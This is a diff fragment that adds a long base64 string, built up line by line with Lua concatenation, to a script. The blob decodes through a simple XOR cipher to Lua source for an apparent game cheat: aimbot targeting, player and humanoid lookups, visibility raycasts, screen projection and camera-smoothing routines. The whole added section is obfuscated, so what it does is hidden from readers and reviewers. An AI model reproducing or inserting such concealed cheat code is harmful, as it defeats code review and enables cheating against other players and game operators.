+    .. "/fv6vL2enrS0tLS0tLS0tLS0tLS0tLTm8fP95+Dx5tH64P3g7byetLS0tLS0tLS0tLS0tLS0"
+    .. "tLS0tLT9+ufg9fr38Z60tLS0tLS0tLS0tLS0tLS0vZ6etLS0tLS0tLS0tLS08frwvZ6etLS0"
+    .. "tLS0tLS0tLS05vHg4eb6nrS0tLS0tLS08frwnp60tLS0tLS0tP3ytP365+D1+vfxutr1+fG0"
+    .. "qam0ttzh+fX6+/3wtp60tLS0tLS0tLS0tLT75rT9+ufg9fr38bra9fnxtKmptLbc4fn1+vv9"
+    .. "8Mb7++DE9ebgtrTg/PH6np60tLS0tLS0tLS0tLT4+/f1+LT5+/Dx+LSpnrS0tLS0tLS0tLS0"
+    .. "tLS0tLT9+ufg9fr38a7S/frw0v3m5+DV+vfx5+D75tvy1/j15+e8nrS0tLS0tLS0tLS0tLS0"
+    .. "tLS0tLS0ttn78PH4tp60tLS0tLS0tLS0tLS0tLS0vZ6etLS0tLS0tLS0tLS0/fK0+fvw8fi0"
+    .. "4Pzx+p6etLS0tLS0tLS0tLS0tLS0tOD15/+68PHy8ea88uH69+D9+/q8vZ6etLS0tLS0tLS0"
+    .. "tLS0tLS0tLS0tLTm8fP95+Dx5tH64P3g7byetLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0+fvw"
+    .. "8fietLS0tLS0tLS0tLS0tLS0tLS0tLS9np60tLS0tLS0tLS0tLS0tLS08frwvZ6etLS0tLS0"
+    .. "tLS0tLS08frwnrS0tLS0tLS08frwnrS0tLTx+vCevZ6enuP75v/n5PX38brQ8ef38frw9frg"
+    .. "xvH5++L9+vOu1/v6+vH34LyetLS0tPLh+vfg/fv6vP365+D1+vfxvZ6etLS0tLS0tLT98rT9"
+    .. "+ufg9fr38a7d59W8ttn78PH4tr204Pzx+p6etLS0tLS0tLS0tLS04frm8fP95+Dx5tH64P3g"
+    .. "7byetLS0tLS0tLS0tLS0tLS0tP365+D1+vfxnrS0tLS0tLS0tLS0tL2enrS0tLS0tLS0tLS0"
+    .. "tObx4OHm+p60tLS0tLS0tPH68J6etLS0tLS0tLT98rT9+ufg9fr38bra9fnxtKmptLbc4fn1"
+    .. "+vv98LaetLS0tLS0tLS0tLS0++a0/frn4PX69/G62vX58bSpqbS23OH59fr7/fDG+/vgxPXm"
+    .. "4La04Pzx+p6etLS0tLS0tLS0tLS0+Pv39fi0+fvw8fi0qZ60tLS0tLS0tLS0tLS0tLS0/frn"
+    .. "4PX69/Gu0v368NL95ufg1fr38efg++bb8tf49efnvJ60tLS0tLS0tLS0tLS0tLS0tLS0tLbZ"
+    .. "+/Dx+LaetLS0tLS0tLS0tLS0tLS0tL2enrS0tLS0tLS0tLS0tP3ytPn78PH4tOD88fqenrS0"
+    .. "tLS0tLS0tLS0tLS0tLTh+ubx8/3n4PHm0frg/eDtvJ60tLS0tLS0tLS0tLS0tLS0tLS0tPn7"
+    .. "8PH4nrS0tLS0tLS0tLS0tLS0tLS9np60tLS0tLS0tLS0tLTx+vCetLS0tLS0tLTx+vCetLS0"
+    .. "tPH68J69np6eubm7u6mpqampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqZ65ubu7tNPRwLTR2sDdwM202N3HwJ65ubu7qampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampnp74+/f1+LTy4fr34P37"
+    .. "+rTz8eDR+uD94O3Z+/Dx+Oe8vZ6etLS0tP36/eD99fj97vHR+uD94O3X9ff88by9np60tLS0"
+    .. "+Pv39fi08frg/eD98ee0qbTv6Z6etLS0tPL75rT5+/Dx+LT9+rTk9f3m57zx+uD94O3X9ff8"
+    .. "8b208PuenrS0tLS0tLS0/fK0+fvw8fietLS0tLS0tLS0tLS09frwtPn78PH4usT15vH64LTg"
+    .. "/PH6np60tLS0tLS0tLS0tLT4+/f1+LT84fn1+vv98LSpnrS0tLS0tLS0tLS0tLS0tLT5+/Dx"
+    .. "+K7S/frw0v3m5+DX/P348Nvy1/j15+e8nrS0tLS0tLS0tLS0tLS0tLS0tLS0ttzh+fX6+/3w"
+    .. "tp60tLS0tLS0tLS0tLS0tLS0vZ6etLS0tLS0tLS0tLS0+Pv39fi05vv74LSpnrS0tLS0tLS0"
+    .. "tLS0tLS0tLT5+/Dx+K7S/frw0v3m5+DX/P348LyetLS0tLS0tLS0tLS0tLS0tLS0tLS23OH5"
+    .. "9fr7/fDG+/vgxPXm4LaetLS0tLS0tLS0tLS0tLS0tL2enrS0tLS0tLS0tLS0tLm5tNn1//G0"
+    .. "5+Hm8bT94LT957Tn4P34+LT1tOL1+P3wtPH64P3g7bqetLS0tLS0tLS0tLS0/fK0/OH59fr7"
+    .. "/fCetLS0tLS0tLS0tLS0tLS0tPX68LTm+/vgnrS0tLS0tLS0tLS0tLS0tLT1+vC05vv74K7d"
+    .. "59W8ttb15/HE9ebgtr2etLS0tLS0tLS0tLS0tLS0tPX68LT84fn1+vv98Lrc8fX44Py0qrSk"
+    .. "nrS0tLS0tLS0tLS0tLS0tLT1+vC0+vvgtMT49e3x5ueu0/HgxPj17fHm0ub7+df89eb19+Dx"
+    .. "5ryetLS0tLS0tLS0tLS0tLS0tLS0tLT5+/Dx+J60tLS0tLS0tLS0tLS0tLS0vbTg/PH6np60"
+    .. "tLS0tLS0tLS0tLS0tLS08frg/eD98efPt/H64P3g/fHntL+0pcm0qZ60tLS0tLS0tLS0tLS0"
+    .. "tLS0tLS0tPn78PH4np60tLS0tLS0tLS0tLTx+Ofxnp60tLS0tLS0tLS0tLS0tLS08frg/eDt"
+    .. "1/X3/PHP+fvw8fjJtKmetLS0tLS0tLS0tLS0tLS0tLS0tLT6/fienrS0tLS0tLS0tLS0tPH6"
+    .. "8J6etLS0tLS0tLTx+Ofxnp60tLS0tLS0tLS0tLTx+uD94O3X9ff88c/5+/Dx+Mm0qZ60tLS0"
+    .. "tLS0tLS0tLS0tLS0+v34np60tLS0tLS0tPH68J60tLS08frwnp60tLS05vHg4eb6tPH64P3g"
+    .. "/fHnnvH68J6enrm5u7upqampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqameubm7u7TE2NXN0ca0wNXG09HAtMfX28bRnrm5u7upqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampqampqamenvj79/X4tPLh"
+    .. "+vfg/fv6tPPx4MT49e3x5sD15vPx4Mf3++bxvJ60tLS05Pj17fHmuJ60tLS09/X58eb1nr2e"
+    .. "nrS0tLT98rT6++C03MbEtOD88fqetLS0tLS0tLTm8eDh5vq0+v34nrS0tLTx+vCenrS0tLT9"
+    .. "8rTk+PXt8ea0qam02Pv39fjE+PXt8ea04Pzx+p60tLS0tLS0tObx4OHm+rT6/fietLS0tPH6"
+    .. "8J6etLS0tLm5tMDx9fm09/zx9/+etLS0tP3ytODx9fnX/PH3/560tLS0tLS0tPX68LTk+PXt"
+    .. "8ea6wPH1+bSpqbTY+/f1+MT49e3x5rrA8fX5tOD88fqenrS0tLS0tLS05vHg4eb6tPr9+J60"
+    .. "tLS08frwnp60tLS0+Pv39fi09/z15vX34PHmtKmetLS0tLS0tLTk+PXt8ea61/z15vX34PHm"
+    .. "np60tLS0/fK0+vvgtPf89eb19+Dx5rTg/PH6nrS0tLS0tLS05vHg4eb6tPr9+J60tLS08frw"
+    .. "np60tLS0+Pv39fi0/OH59fr7/fC0qZ60tLS0tLS0tPf89eb19+Dx5q7S/frw0v3m5+DX/P34"
+    .. "8Nvy1/j15+e8nrS0tLS0tLS0tLS0tLbc4fn1+vv98LaetLS0tLS0tLS9np60tLS0+Pv39fi0"
+    .. "5vv74LSpnrS0tLS0tLS09/z15vX34PHmrtL9+vDS/ebn4Nf8/fjwvJ60tLS0tLS0tLS0tLS2"
+    .. "3OH59fr7/fDG+/vgxPXm4LaetLS0tLS0tLS9np60tLS0+Pv39fi05PXm4LSpnrS0tLS0tLS0"
+    .. "8/HgwPXm8/HgxPXm4LyetLS0tLS0tLS0tLS09/z15vX34PHmnrS0tLS0tLS0vZ6etLS0tP3y"
+    .. "tPr74LT84fn1+vv98J60tLS0tLS0tPvmtPzh+fX6+/3wutzx9fjg/LSoqbSknrS0tLS0tLS0"
+    .. "++a0+vvgtOb7++CetLS0tLS0tLT75rT6++C05PXm4LTg/PH6np60tLS0tLS0tObx4OHm+rT6"
+    .. "/fietLS0tPH68J6etLS0tLm5tMP75vjwtPD95+D1+vfxnrS0tLT4+/f1+LTj++b48ND95+D1"
+    .. "+vfxtKmetLS0tLS0tLS8nrS0tLS0tLS0tLS0tNzGxLrE++f94P37+p60tLS0tLS0tLS0tLS5"
+    .. "tOb7++C6xPvn/eD9+/qetLS0tLS0tLS9utn18/r94OHw8Z6etLS0tP3ytOP75vjw0P3n4PX6"
+    .. "9/G0qp60tLS0tLS0tPX9+fb74Nn17ND95+D1+vfxtOD88fqenrS0tLS0tLS05vHg4eb6tPr9"
+    .. "+J60tLS08frwnp60tLS0ubm0x/fm8fH6tOT75/3g/fv6nrS0tLT4+/f1+LTn9+bx8frE++f9"
+    .. "4P37+rietLS0tLS0tLT7+sf35vHx+rSpnrS0tLS0tLS09/X58eb1rsP75vjwwPvC/fHj5Pvm"
+    .. "4MT7/frgvJ60tLS0tLS0tLS0tLTk9ebgusT75/3g/fv6nrS0tLS0tLS0vZ6etLS0tP3ytPr7"
+    .. "4LT7+sf35vHx+rTg/PH6nrS0tLS0tLS05vHg4eb6tPr9+J60tLS08frwnp60tLS0ubm0wv3n"
+    .. "/fb9+P3g7Z60tLS0/fK0+vvgtP3nwv3n/fb48byetLS0tLS0tLT39fnx5vW4nrS0tLS0tLS0"
+    .. "5PXm4LietLS0tLS0tLT3/PXm9ffg8eaetLS0tL204Pzx+p6etLS0tLS0tLTm8eDh5vq0+v34"
+    .. "nrS0tLTx+vCenrS0tLS5ubTS28KetLS0tPj79/X4tPfx+uDx5rSpnrS0tLS0tLS09/X58eb1"
+    .. "usL98ePk++bgx/3u8bS7tKaenrS0tLT4+/f1+LTn9+bx8frQ/efg9fr38bSpnrS0tLS0tLS0"
+    .. "vJ60tLS0tLS0tLS0tLTC8ffg++amuvrx47yetLS0tLS0tLS0tLS0tLS0tOf35vHx+sT75/3g"
+    .. "/fv6usy4nrS0tLS0tLS0tLS0tLS0tLTn9+bx8frE++f94P37+rrNnrS0tLS0tLS0tLS0tL2e"
+    .. "tLS0tLS0tLS0tLS0ubT38frg8eaetLS0tLS0tLS9utn18/r94OHw8Z6etLS0tP3ytPX9+fb7"
+    .. "4NLbwtH69fb48fCetLS0tLS0tLT1+vC05/fm8fH60P3n4PX69/G0qrT1/fn2++DS28K04Pzx"
+    .. "+p6etLS0tLS0tLTm8eDh5vq0+v34nrS0tLTx+vCenrS0tLS5ubTE5v375v3g7Z60tLS0/fK0"
+    .. "9f359vvgxOb9++b94O20qam0ttf4++fx5+C2tOD88fqenrS0tLS0tLS05vHg4eb6tOP75vjw"
+    .. "0P3n4PX69/GenrS0tLTx+Ofx/fK09f359vvgxOb9++b94O20qam0ttj74/Hn4LTc8fX44Py2"
+    .. "tOD88fqenrS0tLS0tLS05vHg4eb6tPzh+fX6+/3wutzx9fjg/J6etLS0tPH45/GenrS0tLS0"
+    .. "tLS05vHg4eb6tOf35vHx+tD95+D1+vfxnp60tLS08frwnvH68J6enrm5u7upqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampqampqameubm7u7TR2sDd"
+    .. "wM20wNXG09HAtMfX28bRnrm5u7upqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqamenvj79/X4tPLh+vfg/fv6tPPx4NH64P3g7cD15vPx4Mf3"
+    .. "++bxvJ60tLS08frg/eDtuJ60tLS09/X58eb1nr2enrS0tLT98rT6++C03MbEtOD88fqetLS0"
+    .. "tLS0tLTm8eDh5vq0+v34nrS0tLTx+vCenrS0tLT98rT6++C08frg/eDtnrS0tLS0tLS0++a0"
+    .. "+vvgtPH64P3g7brE9ebx+uC04Pzx+p6etLS0tLS0tLTm8eDh5vq0+v34nrS0tLTx+vCenrS0"
+    .. "tLS5ubTR+uD94O202cHHwLTa28C09vG09bTE+PXt8ea6nrS0tLT98rTE+PXt8ebnrtPx4MT4"
+    .. "9e3x5tLm+/nX/PXm9ffg8ea8nrS0tLS0tLS08frg/eDtnrS0tLS9tOD88fqenrS0tLS0tLS0"
+    .. "5vHg4eb6tPr9+J60tLS08frwnp60tLS0+Pv39fi0/OH59fr7/fC0qZ60tLS0tLS0tPH64P3g"
+    .. "7a7S/frw0v3m5+DX/P348Nvy1/j15+e8nrS0tLS0tLS0tLS0tLbc4fn1+vv98LaetLS0tLS0"
+    .. "tLS9np60tLS0+Pv39fi05vv74LSpnrS0tLS0tLS08frg/eDtrtL9+vDS/ebn4Nf8/fjwvJ60"
+    .. "tLS0tLS0tLS0tLS23OH59fr7/fDG+/vgxPXm4LaetLS0tLS0tLS9np60tLS0+Pv39fi05PXm"
+    .. "4LSpnrS0tLS0tLS08/HgwPXm8/HgxPXm4LyetLS0tLS0tLS0tLS08frg/eDtnrS0tLS0tLS0"
+    .. "vZ6etLS0tLm5tMbx5eH95vHwtPH64P3g7bTn4Obh9+Dh5vG6nrS0tLT98rT6++C0/OH59fr7"
+    .. "/fCetLS0tLS0tLT75rT84fn1+vv98Lrc8fX44Py0qKm0pJ60tLS0tLS0tPvmtPr74LTm+/vg"
+    .. "nrS0tLS0tLS0++a0+vvgtOb7++Cu3efVvLbW9efxxPXm4La9nrS0tLS0tLS0++a0+vvgtOT1"
+    .. "5uC04Pzx+p6etLS0tLS0tLTm8eDh5vq0+v34nrS0tLTx+vCenrS0tLS5ubTQ/efg9fr38Z60"
+    .. "tLS0+Pv39fi04/vm+PDQ/efg9fr38bSpnrS0tLS0tLS0vJ60tLS0tLS0tLS0tLTcxsS6xPvn"
+    .. "/eD9+/qetLS0tLS0tLS0tLS0ubTm+/vgusT75/3g/fv6nrS0tLS0tLS0vbrZ9fP6/eDh8PGe"
+    .. "nrS0tLT98rTj++b48ND95+D1+vfxtKqetLS0tLS0tLT1/fn2++DZ9ezQ/efg9fr38bTg/PH6"
+    .. "np60tLS0tLS0tObx4OHm+rT6/fietLS0tPH68J6etLS0tLm5tMf35vHx+rTk++f94P37+p60"
+    .. "tLS0+Pv39fi05/fm8fH6xPvn/eD9+/q4nrS0tLS0tLS0+/rH9+bx8fq0qZ60tLS0tLS0tPf1"
+    .. "+fHm9a7D++b48MD7wv3x4+T75uDE+/364LyetLS0tLS0tLS0tLS05PXm4LrE++f94P37+p60"
+    .. "tLS0tLS0tL2enrS0tLT98rT6++C0+/rH9+bx8fq04Pzx+p60tLS0tLS0tObx4OHm+rT6/fie"
+    .. "tLS0tPH68J6etLS0tLm5tML95/32/fj94O2etLS0tP3ytPr74LT958L95/32+PG8nrS0tLS0"
+    .. "tLS09/X58eb1uJ60tLS0tLS0tOT15uC4nrS0tLS0tLS08frg/eDtnrS0tLS9tOD88fqenrS0"
+    .. "tLS0tLS05vHg4eb6tPr9+J60tLS08frwnp60tLS0ubm00tvCnrS0tLT4+/f1+LT38frg8ea0"
+    .. "qZ60tLS0tLS0tPf1+fHm9brC/fHj5Pvm4Mf97vG0u7Smnp60tLS0+Pv39fi05/fm8fH60P3n"
+    .. "4PX69/G0qZ60tLS0tLS0tLyetLS0tLS0tLS0tLS0wvH34Pvmprr68eO8nrS0tLS0tLS0tLS0"
+    .. "tLS0tLTn9+bx8frE++f94P37+rrMuJ60tLS0tLS0tLS0tLS0tLS05/fm8fH6xPvn/eD9+/q6"
+    .. "zZ60tLS0tLS0tLS0tLS9nrS0tLS0tLS0tLS0tLm09/H64PHmnrS0tLS0tLS0vbrZ9fP6/eDh"
+    .. "8PGenrS0tLT98rT1/fn2++DS28LR+vX2+PHwnrS0tLS0tLS09frwtOf35vHx+tD95+D1+vfx"
+    .. "tKq09f359vvg0tvCtOD88fqenrS0tLS0tLS05vHg4eb6tPr9+J60tLS08frwnp60tLS0ubm0"
+    .. "xOb9++b94O2etLS0tP3ytPX9+fb74MTm/fvm/eDttKmptLbX+Pvn8efgtrTg/PH6np60tLS0"
+    .. "tLS0tObx4OHm+rTj++b48ND95+D1+vfxnp60tLS08fjn8f3ytPX9+fb74MTm/fvm/eDttKmp"
+    .. "tLbY++Px5+C03PH1+OD8trTg/PH6np60tLS0tLS0tObx4OHm+rT84fn1+vv98Lrc8fX44Pye"
+    .. "nrS0tLTx+Ofxnp60tLS0tLS0tObx4OHm+rTn9+bx8frQ/efg9fr38Z6etLS0tPH68J7x+vCe"
+    .. "np65ubu7qampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampnrm5u7u00t3a0LTW0cfAtMDVxtPRwJ65ubu7qampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampnp74+/f1+LTy4fr34P37+rTz8eDW"
+    .. "8efgwPXm8/HgvJ60tLS09/X58eb1nr2enrS0tLT4+/f1+LT28efgwPXm8/HgtKm0+v34nrS0"
+    .. "tLT4+/f1+LT28efgx/f75vG0qbT59eD8uvzh8/Genp60tLS0ubmpqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampnrS0tLS5ubTb2tjNtMTY1c3R"
+    .. "xseetLS0tLm5qampqampqampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqZ6etLS0tP3ytPX9+fb74Nv6+O3E+PXt8ebntOD88fqenrS0tLS0tLS08vvmtMu4"
+    .. "tOT49e3x5rT9+rT95PX95ue8nrS0tLS0tLS0tLS0tMT49e3x5ueu0/HgxPj17fHm57y9nrS0"
+    .. "tLS0tLS0vbTw+56etLS0tLS0tLS0tLS0+Pv39fi05/f75vG0qZ60tLS0tLS0tLS0tLS0tLS0"
+    .. "8/HgxPj17fHmwPXm8/Hgx/f75vG8nrS0tLS0tLS0tLS0tLS0tLS0tLS05Pj17fHmuJ60tLS0"
+    .. "tLS0tLS0tLS0tLS0tLS0tPf1+fHm9Z60tLS0tLS0tLS0tLS0tLS0vZ6etLS0tLS0tLS0tLS0"
+    .. "/fK05/f75vGetLS0tLS0tLS0tLS0tLS0tPX68LTn9/vm8bSotPbx5+DH9/vm8bTg/PH6np60"
+    .. "tLS0tLS0tLS0tLS0tLS09vHn4Mf3++bxtKmetLS0tLS0tLS0tLS0tLS0tLS0tLTn9/vm8Z6e"
+    .. "tLS0tLS0tLS0tLS0tLS0tPbx5+DA9ebz8eC0qbTvnrS0tLS0tLS0tLS0tLS0tLS0tLS0wO3k"
+    .. "8bSptLbE+PXt8ea2uJ60tLS0tLS0tLS0tLS0tLS0tLS0tNv2/vH34LSptOT49e3x5rietLS0"
+    .. "tLS0tLS0tLS0tLS0tLS0tLTX/PXm9ffg8ea0qZ60tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTk"
+    .. "+PXt8ea61/z15vX34PHmnrS0tLS0tLS0tLS0tLS0tLTpnrS0tLS0tLS0tLS0tPH68J60tLS0"
+    .. "tLS0tPH68J60tLS08frwnp6etLS0tLm5qampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqZ60tLS0ubm029rYzbTR2sDdwN3Rx560tLS0ubmpqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampnp60tLS0"
+    .. "/fK09f359vvg2/r47dH64P3g/fHntOD88fqenrS0tLS0tLS08vvmtMu4tPH64P3g7bT9+rT9"
+    .. "5PX95ue8nrS0tLS0tLS0tLS0tPPx4NH64P3g7dn78PH457y9nrS0tLS0tLS0vbTw+56etLS0"
+    .. "tLS0tLS0tLS0+Pv39fi05/f75vG0qZ60tLS0tLS0tLS0tLS0tLS08/Hg0frg/eDtwPXm8/Hg"
+    .. "x/f75vG8nrS0tLS0tLS0tLS0tLS0tLS0tLS08frg/eDtuJ60tLS0tLS0tLS0tLS0tLS0tLS0"
+    .. "tPf1+fHm9Z60tLS0tLS0tLS0tLS0tLS0vZ6etLS0tLS0tLS0tLS0/fK05/f75vGetLS0tLS0"
+    .. "tLS0tLS0tLS0tPX68LTn9/vm8bSotPbx5+DH9/vm8bTg/PH6np60tLS0tLS0tLS0tLS0tLS0"
+    .. "9vHn4Mf3++bxtKmetLS0tLS0tLS0tLS0tLS0tLS0tLTn9/vm8Z6etLS0tLS0tLS0tLS0tLS0"
+    .. "tPbx5+DA9ebz8eC0qbTvnrS0tLS0tLS0tLS0tLS0tLS0tLS0wO3k8bSptLbR+uD94O22uJ60"
+    .. "tLS0tLS0tLS0tLS0tLS0tLS0tNv2/vH34LSptPH64P3g7bietLS0tLS0tLS0tLS0tLS0tLS0"
+    .. "tLTX/PXm9ffg8ea0qbTx+uD94O2etLS0tLS0tLS0tLS0tLS0tOmetLS0tLS0tLS0tLS08frw"
+    .. "nrS0tLS0tLS08frwnrS0tLTx+vCenrS0tLTm8eDh5vq09vHn4MD15vPx4J7x+vCenp65ubu7"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "nrm5u7u0x8DbxLTV3dnW28Ceubm7u6mpqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqZ6e+Pv39fi08uH69+D9+/q05+D75NX9+fb74Ly9np60"
+    .. "tLS0/fK09f359vvg1/v6+vH34P37+rTg/PH6np60tLS0tLS0tPX9+fb74Nf7+vrx9+D9+/qu"
+    .. "0P3n9/v6+vH34Ly9np60tLS0tLS0tPX9+fb74Nf7+vrx9+D9+/q0qZ60tLS0tLS0tLS0tLT6"
+    .. "/fietLS0tPH68J6etLS0tPfh5ubx+uDV/fn2++DA9ebz8eC0qZ60tLS0tLS0tPr9+J6etLS0"
+    .. "tPrx7ODA9ebz8eDH8fXm9/y0qZ60tLS0tLS0tKSe8frwnp6eubm7u6mpqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampqZ65ubu7tMfA1cbAtNXd"
+    .. "2dbbwJ65ubu7qampqampqampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampnp74+/f1+LTy4fr34P37+rTn4PXm4NX9+fb74Ly9np60tLS05+D75NX9+fb7"
+    .. "4Ly9np60tLS09f359vvg1/v6+vH34P37+rSpnrS0tLS0tLS0xuH6x/Hm4v338brG8frw8ebH"
+    .. "4PHk5PHwrtf7+vrx9+C8nrS0tLS0tLS0tLS0tPLh+vfg/fv6vL2enrS0tLS0tLS0tLS0tLS0"
+    .. "tLT98rT6++C09f359vvg0fr19vjx8LTg/PH6nrS0tLS0tLS0tLS0tLS0tLS0tLS05vHg4eb6"
+    .. "nrS0tLS0tLS0tLS0tLS0tLTx+vCenp60tLS0tLS0tLS0tLS0tLS0ubmpqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqametLS0tLS0tLS0tLS0tLS0tLm5"
+    .. "tNrbtMDVxtPRwLTZ29DRnrS0tLS0tLS0tLS0tLS0tLS5uampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqZ6etLS0tLS0tLS0tLS0tLS0tP3ytPr74LT1"
+    .. "/fn2++Db+vjtxPj17fHm5560tLS0tLS0tLS0tLS0tLS0tLS0tPX68LT6++C09f359vvg2/r4"
+    .. "7dH64P3g/fHntOD88fqenrS0tLS0tLS0tLS0tLS0tLS0tLS09+Hm5vH64NX9+fb74MD15vPx"
+    .. "4LSpnrS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tPr9+J6etLS0tLS0tLS0tLS0tLS0tLS0tLTm"
+    .. "8eDh5vqetLS0tLS0tLS0tLS0tLS0tPH68J6enrS0tLS0tLS0tLS0tLS0tLT4+/f1+LT39fnx"
+    .. "5vW0qZ60tLS0tLS0tLS0tLS0tLS0tLS0tOP75v/n5PX38brX4ebm8frg1/X58eb1np60tLS0"
+    .. "tLS0tLS0tLS0tLS0/fK0+vvgtPf1+fHm9Z60tLS0tLS0tLS0tLS0tLS0tLS0tPvmtPr74LTc"
+    .. "xsS04Pzx+p6etLS0tLS0tLS0tLS0tLS0tLS0tLTm8eDh5vqetLS0tLS0tLS0tLS0tLS0tPH6"
+    .. "8J6enrS0tLS0tLS0tLS0tLS0tLS5uampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqZ60tLS0tLS0tLS0tLS0tLS0ubm0wNXG09HAtMfR1cbX3LTA3Mbb"
+    .. "wMDY0Z60tLS0tLS0tLS0tLS0tLS0ubmpqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqametLS0tLS0tLS0tLS0tLS0tLm5nrS0tLS0tLS0tLS0tLS0tLS5"
+    .. "ubTA/PG08ezk8frn/eLxtOfx9eb3/LT7+vjttPz15OTx+ue08eLx5u2etLS0tLS0tLS0tLS0"
+    .. "tLS0tLm5tKS6paS05/H3+/rw57T9+ufg8fXwtPvytPHi8ebttPLm9fnxup60tLS0tLS0tLS0"
+    .. "tLS0tLS0ubmetLS0tLS0tLS0tLS0tLS0tLm5tNf1+fHm9bT5++Lx+fH64LTn4P34+LT89eTk"
+    .. "8frntPHi8ebttPLm9fnxup60tLS0tLS0tLS0tLS0tLS0ubmenrS0tLS0tLS0tLS0tLS0tLT4"
+    .. "+/f1+LT6++O0qZ60tLS0tLS0tLS0tLS0tLS0tLS0tPvnuvf4+/f/vL2enrS0tLS0tLS0tLS0"
+    .. "tLS0tLT98rT6++O0qqm0+vHs4MD15vPx4Mfx9eb3/LTg/PH6np60tLS0tLS0tLS0tLS0tLS0"
+    .. "tLS0tPfh5ubx+uDV/fn2++DA9ebz8eC0qZ60tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTz8eDW"
+    .. "8efgwPXm8/HgvJ60tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS09/X58eb1nrS0tLS0tLS0"
+    .. "tLS0tLS0tLS0tLS0tLS0tL2enrS0tLS0tLS0tLS0tLS0tLS0tLS0+vHs4MD15vPx4Mfx9eb3"
+    .. "/LSpnrS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tPr74560tLS0tLS0tLS0tLS0tLS0tLS0tLS0"
+    .. "tLS/tNXd2dbbwMvA1cbT0cDLxtHSxtHH3J60tLS0tLS0tLS0tLS0tLS08frwnp6etLS0tLS0"
+    .. "tLS0tLS0tLS0tLm5qampqampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampnrS0tLS0tLS0tLS0tLS0tLS5ubTXwcbG0drAtMDVxtPRwJ60tLS0tLS0tLS0tLS0"
+    .. "tLS0ubmpqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqame"
+    .. "nrS0tLS0tLS0tLS0tLS0tLT4+/f1+LTg9ebz8eC0qZ60tLS0tLS0tLS0tLS0tLS0tLS0tPfh"
+    .. "5ubx+uDV/fn2++DA9ebz8eCenrS0tLS0tLS0tLS0tLS0tLT98rT6++C04PXm8/HgnrS0tLS0"
+    .. "tLS0tLS0tLS0tLS0tLS0++a0+vvgtOD15vPx4LrX/PXm9ffg8ea04Pzx+p6etLS0tLS0tLS0"
+    .. "tLS0tLS0tLS0tLT34ebm8frg1f359vvgwPXm8/HgtKmetLS0tLS0tLS0tLS0tLS0tLS0tLS0"
+    .. "tLS0+v34np60tLS0tLS0tLS0tLS0tLS0tLS0tObx4OHm+p60tLS0tLS0tLS0tLS0tLS08frw"
+    .. "np6etLS0tLS0tLS0tLS0tLS0tLm5qampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampnrS0tLS0tLS0tLS0tLS0tLS5ubTA1cbT0cC0xNXGwJ60tLS0tLS0"
+    .. "tLS0tLS0tLS0ubmpqampqampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqamenrS0tLS0tLS0tLS0tLS0tLT4+/f1+LTk9ebgtKmetLS0tLS0tLS0tLS0tLS0tLS0"
+    .. "tLTz8eDA9ebz8eDE9ebgvJ60tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTg9ebz8eC61/z15vX3"
+    .. "4PHmnrS0tLS0tLS0tLS0tLS0tLS0tLS0vZ6etLS0tLS0tLS0tLS0tLS0tP3ytPr74LTk9ebg"
+    .. "tOD88fqenrS0tLS0tLS0tLS0tLS0tLS0tLS09+Hm5vH64NX9+fb74MD15vPx4LSpnrS0tLS0"
+    .. "tLS0tLS0tLS0tLS0tLS0tLS0tPr9+J6etLS0tLS0tLS0tLS0tLS0tLS0tLTm8eDh5vqetLS0"
+    .. "tLS0tLS0tLS0tLS0tPH68J6enrS0tLS0tLS0tLS0tLS0tLS5uampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqZ60tLS0tLS0tLS0tLS0tLS0ubm019XZ"
+    .. "0cbVtMfZ29vA3N3a0560tLS0tLS0tLS0tLS0tLS0ubmpqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqamenrS0tLS0tLS0tLS0tLS0tLT4+/f1+LTg9ebz"
+    .. "8eDX0ub1+fG0qZ60tLS0tLS0tLS0tLS0tLS0tLS0tNfS5vX58br4+/v/1eC8nrS0tLS0tLS0"
+    .. "tLS0tLS0tLS0tLS0tLS0tPf1+fHm9brX0ub1+fG6xPvn/eD9+/q4nrS0tLS0tLS0tLS0tLS0"
+    .. "tLS0tLS0tLS0tOT15uC6xPvn/eD9+/qetLS0tLS0tLS0tLS0tLS0tLS0tLS9np60tLS0tLS0"
+    .. "tLS0tLS0tLS09/X58eb1utfS5vX58bSpnrS0tLS0tLS0tLS0tLS0tLS0tLS09/X58eb1utfS"
